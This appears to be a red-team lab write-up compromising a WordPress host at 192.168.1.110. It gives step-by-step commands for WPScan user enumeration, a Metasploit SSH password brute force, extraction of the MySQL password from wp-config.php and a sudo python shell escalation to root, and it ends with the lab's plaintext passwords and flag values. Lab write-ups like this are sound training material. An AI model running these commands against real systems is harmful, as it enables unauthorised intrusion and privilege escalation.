# Red Team: Summary of Operations

## Table of Contents
- Exposed Services
- Critical Vulnerabilities
- Exploitation

### Exposed Services

Nmap scan results for each machine reveal the below services and OS details:

`$ nmap -sV -O 192.168.1.110`

![Initial Nmap Scan](Images/InitialNmapScan.png "Nmap Scan")

This scan identifies the services below as potential points of entry:
- Target 1
  - Port 22/TCP: OpenSSH
  - Port 80/TCP: Apache web server
  - Port 111/TCP: rpcbind
  - Port 139/TCP: Samba smbd
  - Port 445/TCP: Samba smbd

The following vulnerabilities were identified on each target:
- Target 1
  - Wordpress server is vulnerable to user enumeration
  - Wordpress and ssh server have weak passwords
  - MySQL password is stored in plain text
  - Wordpress hashes are stored unsalted
  - Steven user account has sudo permissions for Python

### Exploitation

The Red Team was able to penetrate `Target 1` and retrieve the following confidential data:
- Target 1
  - `flag1`: flag1{b9bbcb33e11b80be759c4e844862482d}
    - **Exploit Used**
      - Start with a user enumeration of the Wordpress website using Wpscan
        - `wpscan --url http://192.168.1.110/wordpress --enumerate u`
        - ![WPScan](Images/Wpscan.png "WPScan")
      - Using the ssh module in Metasploit we will break into Michael's account
        - `msfconsole`
        - `search ssh`
        - `use auxiliary/scanner/ssh/ssh_login`
        - `show options`
        - `set username michael`
        - `set user_as_pass true`
        - `set pass_file /usr/share/wordlists/rockyou.txt`
        - `set rhosts 192.168.1.110`
        - `set rport 22`
        - `set stop_on_success true`
        - ![Metasploit](Images/Metasploit.png "Metasploit SSH Cracker") 
        - Michael's password is michael
      - Now that we have access to Michael's account we ssh in and search the website filed for the first flag
        - `ssh michael@192.168.1.110`
        - `cd /var/www/html`
        - `grep -nr 'flag1'`
        - ![flag1](Images/flag1.png "First flag") 
  - `flag2`: flag2{fc3fd58dcdad9ab23faca6e9a36e581c}
    - **Exploit Used**
      - We have the ssh login for Michael from the first flag so we login with that again and run a find command to locate any files named flag
        - `ssh michael@192.168.1.110`
        - `find / -iname '*flag*' -type f -print 2>/dev/null`
        - ![flag2](Images/flag2Location.png "Second flag location") 
        - We now know it is stored in /var/www/flag2.txt
        - `cat /var/www/flag2.txt`
        - ![flag2](Images/flag2.png "Second flag") 
  - `flag3`: flag3{afc01ab56b50591e7dccf93122770cd2}
    - **Exploit Used**
      - Found the MySQL password in wp-config.php
	  - Searched the posts in wp_posts for flag
      - select post_content from wp_posts where post_content like '%flag%';
  - `flag4`: flag4{715dea6c055b9fe3337544932f2941ce}
    - **Exploit Used**
      - Logged into Steven after cracking the password hash from mysql
	  - escalated to root using sudo python -c 'import pty; pty.spawn("/bin/sh")'
      - find / -iname '*flag*' -type f
	  
	  
	  
steven:pink84
michael:michael
mysql
	root:R@v3nSecurity
